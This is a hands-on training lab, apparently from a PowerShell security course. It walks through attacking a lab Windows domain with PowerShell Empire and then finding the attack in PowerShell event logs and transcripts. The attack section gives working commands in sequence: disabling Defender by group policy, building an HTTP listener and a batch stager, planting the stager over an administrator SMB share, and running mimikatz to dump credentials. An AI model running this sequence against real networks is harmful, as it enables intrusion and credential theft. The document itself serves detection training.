break

# Lab 04 - Hunting Malware

## Objective

## Background

## Overview

## Exercise 4.1 - Investigating an attack launched from PowerShell Empire

### 4.1.1 Prepare the target machine

Invoke-Command -ComputerName ts1 -ScriptBlock {Set-GPLink -Name 'PowerShell Security' -Target 'DC=training,DC=com' -LinkEnabled Yes}

Invoke-Command -ComputerName ts1 -ScriptBlock {Set-GPLink -Name 'Disable Defender' -Target 'DC=training,DC=com' -LinkEnabled Yes}

gpupdate /force /wait:0

Get-ChildItem HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ -Recurse

iex 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c138 6'

### 4.1.2 Generate the Empire listener and stager

su

cd /root/Empire

./empire

listeners

uselistener http

set Port 8080

set Host http://TAB_for_IP_autofill:8080

info

execute

back

list

back

usestager windows/launcher_bat

info

set Listener http

set Delete False

info

generate

exit

y

smbclient //client-01/c$ -U administrator -W training

dir

cd badness

put /tmp/launcher.bat ./launcher.bat

quit

### 4.1.3 Infect the target machine

su

cd /root/Empire

./empire

cd \badness

agents

rename RANDOMNAME client01 *substitute the random name from the output above*

list

interact client01

?

sysinfo

mimikatz *This takes some time to return results*

creds

back

kill client-01

y

exit

y

### 4.1.4 Find the badness in the logs and transcripts

Get-WinEvent -LogName 'Windows PowerShell' -FilterXPath '*[System[(EventID=800)]]' -MaxEvents 100 | Format-Table TimeCreated, Message -Wrap

Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -FilterXPath '*[System[(EventID=4103)]]' -MaxEvents 100 | Format-Table TimeCreated, Message -Wrap

Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -FilterXPath '*[System[(EventID=4104)]]' -MaxEvents 100 | Format-Table TimeCreated, Message -Wrap

Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -FilterXPath '*[System[(EventID=4103)]]' -MaxEvents 1000 | Where-Object Message -like "*mimikatz*" | Format-Table TimeCreated, Message -Wrap

Select-String -Path C:\PSTranscripts\*\* -Pattern mimikatz

